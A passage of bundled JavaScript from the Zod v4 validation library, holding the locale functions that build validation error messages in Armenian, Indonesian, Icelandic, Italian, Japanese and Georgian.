          return `\u054D\u056D\u0561\u056C \u057F\u0578\u0572\u2024 \u057A\u0565\u057F\u0584 \u0567 \u057D\u056F\u057D\u057E\u056B "${_issue.prefix}"-\u0578\u057E`;
        if (_issue.format === "ends_with")
          return `\u054D\u056D\u0561\u056C \u057F\u0578\u0572\u2024 \u057A\u0565\u057F\u0584 \u0567 \u0561\u057E\u0561\u0580\u057F\u057E\u056B "${_issue.suffix}"-\u0578\u057E`;
        if (_issue.format === "includes")
          return `\u054D\u056D\u0561\u056C \u057F\u0578\u0572\u2024 \u057A\u0565\u057F\u0584 \u0567 \u057A\u0561\u0580\u0578\u0582\u0576\u0561\u056F\u056B "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u054D\u056D\u0561\u056C \u057F\u0578\u0572\u2024 \u057A\u0565\u057F\u0584 \u0567 \u0570\u0561\u0574\u0561\u057A\u0561\u057F\u0561\u057D\u056D\u0561\u0576\u056B ${_issue.pattern} \u0571\u0587\u0561\u0579\u0561\u0583\u056B\u0576`;
        return `\u054D\u056D\u0561\u056C ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u054D\u056D\u0561\u056C \u0569\u056B\u057E\u2024 \u057A\u0565\u057F\u0584 \u0567 \u0562\u0561\u0566\u0574\u0561\u057A\u0561\u057F\u056B\u056F \u056C\u056B\u0576\u056B ${issue2.divisor}-\u056B`;
      case "unrecognized_keys":
        return `\u0549\u0573\u0561\u0576\u0561\u0579\u057E\u0561\u056E \u0562\u0561\u0576\u0561\u056C\u056B${issue2.keys.length > 1 ? "\u0576\u0565\u0580" : ""}. ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u054D\u056D\u0561\u056C \u0562\u0561\u0576\u0561\u056C\u056B ${withDefiniteArticle(issue2.origin)}-\u0578\u0582\u0574`;
      case "invalid_union":
        return "\u054D\u056D\u0561\u056C \u0574\u0578\u0582\u057F\u0584\u0561\u0563\u0580\u0578\u0582\u0574";
      case "invalid_element":
        return `\u054D\u056D\u0561\u056C \u0561\u0580\u056A\u0565\u0584 ${withDefiniteArticle(issue2.origin)}-\u0578\u0582\u0574`;
      default:
        return `\u054D\u056D\u0561\u056C \u0574\u0578\u0582\u057F\u0584\u0561\u0563\u0580\u0578\u0582\u0574`;
    }
  };
};
function hy_default() {
  return {
    localeError: error18()
  };
}
// node_modules/zod/v4/locales/id.js
var error19 = () => {
  const Sizable = {
    string: { unit: "karakter", verb: "memiliki" },
    file: { unit: "byte", verb: "memiliki" },
    array: { unit: "item", verb: "memiliki" },
    set: { unit: "item", verb: "memiliki" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "alamat email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "tanggal dan waktu format ISO",
    date: "tanggal format ISO",
    time: "jam format ISO",
    duration: "durasi format ISO",
    ipv4: "alamat IPv4",
    ipv6: "alamat IPv6",
    cidrv4: "rentang alamat IPv4",
    cidrv6: "rentang alamat IPv6",
    base64: "string dengan enkode base64",
    base64url: "string dengan enkode base64url",
    json_string: "string JSON",
    e164: "angka E.164",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Input tidak valid: diharapkan instanceof ${issue2.expected}, diterima ${received}`;
        }
        return `Input tidak valid: diharapkan ${expected}, diterima ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Input tidak valid: diharapkan ${stringifyPrimitive(issue2.values[0])}`;
        return `Pilihan tidak valid: diharapkan salah satu dari ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Terlalu besar: diharapkan ${issue2.origin ?? "value"} memiliki ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elemen"}`;
        return `Terlalu besar: diharapkan ${issue2.origin ?? "value"} menjadi ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Terlalu kecil: diharapkan ${issue2.origin} memiliki ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Terlalu kecil: diharapkan ${issue2.origin} menjadi ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `String tidak valid: harus dimulai dengan "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `String tidak valid: harus berakhir dengan "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `String tidak valid: harus menyertakan "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `String tidak valid: harus sesuai pola ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} tidak valid`;
      }
      case "not_multiple_of":
        return `Angka tidak valid: harus kelipatan dari ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Kunci tidak dikenali ${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Kunci tidak valid di ${issue2.origin}`;
      case "invalid_union":
        return "Input tidak valid";
      case "invalid_element":
        return `Nilai tidak valid di ${issue2.origin}`;
      default:
        return `Input tidak valid`;
    }
  };
};
function id_default() {
  return {
    localeError: error19()
  };
}
// node_modules/zod/v4/locales/is.js
var error20 = () => {
  const Sizable = {
    string: { unit: "stafi", verb: "a\xF0 hafa" },
    file: { unit: "b\xE6ti", verb: "a\xF0 hafa" },
    array: { unit: "hluti", verb: "a\xF0 hafa" },
    set: { unit: "hluti", verb: "a\xF0 hafa" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "gildi",
    email: "netfang",
    url: "vefsl\xF3\xF0",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO dagsetning og t\xEDmi",
    date: "ISO dagsetning",
    time: "ISO t\xEDmi",
    duration: "ISO t\xEDmalengd",
    ipv4: "IPv4 address",
    ipv6: "IPv6 address",
    cidrv4: "IPv4 range",
    cidrv6: "IPv6 range",
    base64: "base64-encoded strengur",
    base64url: "base64url-encoded strengur",
    json_string: "JSON strengur",
    e164: "E.164 t\xF6lugildi",
    jwt: "JWT",
    template_literal: "gildi"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "n\xFAmer",
    array: "fylki"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Rangt gildi: \xDE\xFA sl\xF3st inn ${received} \xFEar sem \xE1 a\xF0 vera instanceof ${issue2.expected}`;
        }
        return `Rangt gildi: \xDE\xFA sl\xF3st inn ${received} \xFEar sem \xE1 a\xF0 vera ${expected}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Rangt gildi: gert r\xE1\xF0 fyrir ${stringifyPrimitive(issue2.values[0])}`;
        return `\xD3gilt val: m\xE1 vera eitt af eftirfarandi ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Of st\xF3rt: gert er r\xE1\xF0 fyrir a\xF0 ${issue2.origin ?? "gildi"} hafi ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "hluti"}`;
        return `Of st\xF3rt: gert er r\xE1\xF0 fyrir a\xF0 ${issue2.origin ?? "gildi"} s\xE9 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Of l\xEDti\xF0: gert er r\xE1\xF0 fyrir a\xF0 ${issue2.origin} hafi ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Of l\xEDti\xF0: gert er r\xE1\xF0 fyrir a\xF0 ${issue2.origin} s\xE9 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\xD3gildur strengur: ver\xF0ur a\xF0 byrja \xE1 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\xD3gildur strengur: ver\xF0ur a\xF0 enda \xE1 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\xD3gildur strengur: ver\xF0ur a\xF0 innihalda "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\xD3gildur strengur: ver\xF0ur a\xF0 fylgja mynstri ${_issue.pattern}`;
        return `Rangt ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `R\xF6ng tala: ver\xF0ur a\xF0 vera margfeldi af ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\xD3\xFEekkt ${issue2.keys.length > 1 ? "ir lyklar" : "ur lykill"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Rangur lykill \xED ${issue2.origin}`;
      case "invalid_union":
        return "Rangt gildi";
      case "invalid_element":
        return `Rangt gildi \xED ${issue2.origin}`;
      default:
        return `Rangt gildi`;
    }
  };
};
function is_default() {
  return {
    localeError: error20()
  };
}
// node_modules/zod/v4/locales/it.js
var error21 = () => {
  const Sizable = {
    string: { unit: "caratteri", verb: "avere" },
    file: { unit: "byte", verb: "avere" },
    array: { unit: "elementi", verb: "avere" },
    set: { unit: "elementi", verb: "avere" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "indirizzo email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data e ora ISO",
    date: "data ISO",
    time: "ora ISO",
    duration: "durata ISO",
    ipv4: "indirizzo IPv4",
    ipv6: "indirizzo IPv6",
    cidrv4: "intervallo IPv4",
    cidrv6: "intervallo IPv6",
    base64: "stringa codificata in base64",
    base64url: "URL codificata in base64",
    json_string: "stringa JSON",
    e164: "numero E.164",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "numero",
    array: "vettore"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Input non valido: atteso instanceof ${issue2.expected}, ricevuto ${received}`;
        }
        return `Input non valido: atteso ${expected}, ricevuto ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Input non valido: atteso ${stringifyPrimitive(issue2.values[0])}`;
        return `Opzione non valida: atteso uno tra ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Troppo grande: ${issue2.origin ?? "valore"} deve avere ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementi"}`;
        return `Troppo grande: ${issue2.origin ?? "valore"} deve essere ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Troppo piccolo: ${issue2.origin} deve avere ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Troppo piccolo: ${issue2.origin} deve essere ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Stringa non valida: deve iniziare con "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Stringa non valida: deve terminare con "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Stringa non valida: deve includere "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Stringa non valida: deve corrispondere al pattern ${_issue.pattern}`;
        return `Invalid ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Numero non valido: deve essere un multiplo di ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Chiav${issue2.keys.length > 1 ? "i" : "e"} non riconosciut${issue2.keys.length > 1 ? "e" : "a"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Chiave non valida in ${issue2.origin}`;
      case "invalid_union":
        return "Input non valido";
      case "invalid_element":
        return `Valore non valido in ${issue2.origin}`;
      default:
        return `Input non valido`;
    }
  };
};
function it_default() {
  return {
    localeError: error21()
  };
}
// node_modules/zod/v4/locales/ja.js
var error22 = () => {
  const Sizable = {
    string: { unit: "\u6587\u5B57", verb: "\u3067\u3042\u308B" },
    file: { unit: "\u30D0\u30A4\u30C8", verb: "\u3067\u3042\u308B" },
    array: { unit: "\u8981\u7D20", verb: "\u3067\u3042\u308B" },
    set: { unit: "\u8981\u7D20", verb: "\u3067\u3042\u308B" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u5165\u529B\u5024",
    email: "\u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9",
    url: "URL",
    emoji: "\u7D75\u6587\u5B57",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO\u65E5\u6642",
    date: "ISO\u65E5\u4ED8",
    time: "ISO\u6642\u523B",
    duration: "ISO\u671F\u9593",
    ipv4: "IPv4\u30A2\u30C9\u30EC\u30B9",
    ipv6: "IPv6\u30A2\u30C9\u30EC\u30B9",
    cidrv4: "IPv4\u7BC4\u56F2",
    cidrv6: "IPv6\u7BC4\u56F2",
    base64: "base64\u30A8\u30F3\u30B3\u30FC\u30C9\u6587\u5B57\u5217",
    base64url: "base64url\u30A8\u30F3\u30B3\u30FC\u30C9\u6587\u5B57\u5217",
    json_string: "JSON\u6587\u5B57\u5217",
    e164: "E.164\u756A\u53F7",
    jwt: "JWT",
    template_literal: "\u5165\u529B\u5024"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u6570\u5024",
    array: "\u914D\u5217"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u7121\u52B9\u306A\u5165\u529B: instanceof ${issue2.expected}\u304C\u671F\u5F85\u3055\u308C\u307E\u3057\u305F\u304C\u3001${received}\u304C\u5165\u529B\u3055\u308C\u307E\u3057\u305F`;
        }
        return `\u7121\u52B9\u306A\u5165\u529B: ${expected}\u304C\u671F\u5F85\u3055\u308C\u307E\u3057\u305F\u304C\u3001${received}\u304C\u5165\u529B\u3055\u308C\u307E\u3057\u305F`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u7121\u52B9\u306A\u5165\u529B: ${stringifyPrimitive(issue2.values[0])}\u304C\u671F\u5F85\u3055\u308C\u307E\u3057\u305F`;
        return `\u7121\u52B9\u306A\u9078\u629E: ${joinValues(issue2.values, "\u3001")}\u306E\u3044\u305A\u308C\u304B\u3067\u3042\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      case "too_big": {
        const adj = issue2.inclusive ? "\u4EE5\u4E0B\u3067\u3042\u308B" : "\u3088\u308A\u5C0F\u3055\u3044";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u5927\u304D\u3059\u304E\u308B\u5024: ${issue2.origin ?? "\u5024"}\u306F${issue2.maximum.toString()}${sizing.unit ?? "\u8981\u7D20"}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        return `\u5927\u304D\u3059\u304E\u308B\u5024: ${issue2.origin ?? "\u5024"}\u306F${issue2.maximum.toString()}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? "\u4EE5\u4E0A\u3067\u3042\u308B" : "\u3088\u308A\u5927\u304D\u3044";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u5C0F\u3055\u3059\u304E\u308B\u5024: ${issue2.origin}\u306F${issue2.minimum.toString()}${sizing.unit}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        return `\u5C0F\u3055\u3059\u304E\u308B\u5024: ${issue2.origin}\u306F${issue2.minimum.toString()}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: "${_issue.prefix}"\u3067\u59CB\u307E\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        if (_issue.format === "ends_with")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: "${_issue.suffix}"\u3067\u7D42\u308F\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        if (_issue.format === "includes")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: "${_issue.includes}"\u3092\u542B\u3080\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        if (_issue.format === "regex")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: \u30D1\u30BF\u30FC\u30F3${_issue.pattern}\u306B\u4E00\u81F4\u3059\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        return `\u7121\u52B9\u306A${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u7121\u52B9\u306A\u6570\u5024: ${issue2.divisor}\u306E\u500D\u6570\u3067\u3042\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      case "unrecognized_keys":
        return `\u8A8D\u8B58\u3055\u308C\u3066\u3044\u306A\u3044\u30AD\u30FC${issue2.keys.length > 1 ? "\u7FA4" : ""}: ${joinValues(issue2.keys, "\u3001")}`;
      case "invalid_key":
        return `${issue2.origin}\u5185\u306E\u7121\u52B9\u306A\u30AD\u30FC`;
      case "invalid_union":
        return "\u7121\u52B9\u306A\u5165\u529B";
      case "invalid_element":
        return `${issue2.origin}\u5185\u306E\u7121\u52B9\u306A\u5024`;
      default:
        return `\u7121\u52B9\u306A\u5165\u529B`;
    }
  };
};
function ja_default() {
  return {
    localeError: error22()
  };
}
// node_modules/zod/v4/locales/ka.js
var error23 = () => {
  const Sizable = {
    string: { unit: "\u10E1\u10D8\u10DB\u10D1\u10DD\u10DA\u10DD", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" },
    file: { unit: "\u10D1\u10D0\u10D8\u10E2\u10D8", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" },
    array: { unit: "\u10D4\u10DA\u10D4\u10DB\u10D4\u10DC\u10E2\u10D8", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" },
    set: { unit: "\u10D4\u10DA\u10D4\u10DB\u10D4\u10DC\u10E2\u10D8", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0",
    email: "\u10D4\u10DA-\u10E4\u10DD\u10E1\u10E2\u10D8\u10E1 \u10DB\u10D8\u10E1\u10D0\u10DB\u10D0\u10E0\u10D7\u10D8",
    url: "URL",
    emoji: "\u10D4\u10DB\u10DD\u10EF\u10D8",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u10D7\u10D0\u10E0\u10D8\u10E6\u10D8-\u10D3\u10E0\u10DD",
    date: "\u10D7\u10D0\u10E0\u10D8\u10E6\u10D8",
    time: "\u10D3\u10E0\u10DD",
    duration: "\u10EE\u10D0\u10DC\u10D2\u10E0\u10EB\u10DA\u10D8\u10D5\u10DD\u10D1\u10D0",
    ipv4: "IPv4 \u10DB\u10D8\u10E1\u10D0\u10DB\u10D0\u10E0\u10D7\u10D8",
    ipv6: "IPv6 \u10DB\u10D8\u10E1\u10D0\u10DB\u10D0\u10E0\u10D7\u10D8",
    cidrv4: "IPv4 \u10D3\u10D8\u10D0\u10DE\u10D0\u10D6\u10DD\u10DC\u10D8",
    cidrv6: "IPv6 \u10D3\u10D8\u10D0\u10DE\u10D0\u10D6\u10DD\u10DC\u10D8",
    base64: "base64-\u10D9\u10DD\u10D3\u10D8\u10E0\u10D4\u10D1\u10E3\u10DA\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    base64url: "base64url-\u10D9\u10DD\u10D3\u10D8\u10E0\u10D4\u10D1\u10E3\u10DA\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    json_string: "JSON \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    e164: "E.164 \u10DC\u10DD\u10DB\u10D4\u10E0\u10D8",
    jwt: "JWT",
    template_literal: "\u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u10E0\u10D8\u10EA\u10EE\u10D5\u10D8",
    string: "\u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    boolean: "\u10D1\u10E3\u10DA\u10D4\u10D0\u10DC\u10D8",
    function: "\u10E4\u10E3\u10DC\u10E5\u10EA\u10D8\u10D0",
    array: "\u10DB\u10D0\u10E1\u10D8\u10D5\u10D8"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 instanceof ${issue2.expected}, \u10DB\u10D8\u10E6\u10D4\u10D1\u10E3\u10DA\u10D8 ${received}`;
        }
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${expected}, \u10DB\u10D8\u10E6\u10D4\u10D1\u10E3\u10DA\u10D8 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${stringifyPrimitive(issue2.values[0])}`;
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10D5\u10D0\u10E0\u10D8\u10D0\u10DC\u10E2\u10D8: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8\u10D0 \u10D4\u10E0\u10D7-\u10D4\u10E0\u10D7\u10D8 ${joinValues(issue2.values, "|")}-\u10D3\u10D0\u10DC`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10D3\u10D8\u10D3\u10D8: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue2.origin ?? "\u10DB\u10DC\u10D8\u10E8\u10D5\u10DC\u10D4\u10DA\u10DD\u10D1\u10D0"} ${sizing.verb} ${adj}${issue2.maximum.toString()} ${sizing.unit}`;
        return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10D3\u10D8\u10D3\u10D8: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue2.origin ?? "\u10DB\u10DC\u10D8\u10E8\u10D5\u10DC\u10D4\u10DA\u10DD\u10D1\u10D0"} \u10D8\u10E7\u10DD\u10E1 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10DE\u10D0\u10E2\u10D0\u10E0\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue2.origin} ${sizing.verb} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10DE\u10D0\u10E2\u10D0\u10E0\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue2.origin} \u10D8\u10E7\u10DD\u10E1 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10D8\u10EC\u10E7\u10D4\u10D1\u10DD\u10D3\u10D4\u10E1 "${_issue.prefix}"-\u10D8\u10D7`;
        }
        if (_issue.format === "ends_with")
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10DB\u10D7\u10D0\u10D5\u10E0\u10D3\u10D4\u10D1\u10DD\u10D3\u10D4\u10E1 "${_issue.suffix}"-\u10D8\u10D7`;
        if (_issue.format === "includes")
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1 "${_issue.includes}"-\u10E1`;
        if (_issue.format === "regex")
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D4\u10E1\u10D0\u10D1\u10D0\u10DB\u10D4\u10D1\u10DD\u10D3\u10D4\u10E1 \u10E8\u10D0\u10D1\u10DA\u10DD\u10DC\u10E1 ${_issue.pattern}`;
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E0\u10D8\u10EA\u10EE\u10D5\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10D8\u10E7\u10DD\u10E1 ${issue2.divisor}-\u10D8\u10E1 \u10EF\u10D4\u10E0\u10D0\u10D3\u10D8`;
      case "unrecognized_keys":
        return `\u10E3\u10EA\u10DC\u10DD\u10D1\u10D8 \u10D2\u10D0\u10E1\u10D0\u10E6\u10D4\u10D1${issue2.keys.length > 1 ? "\u10D4\u10D1\u10D8" : "\u10D8"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10D2\u10D0\u10E1\u10D0\u10E6\u10D4\u10D1\u10D8 ${issue2.origin}-\u10E8\u10D8`;
      case "invalid_union":
        return "\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0";
      case "invalid_element":
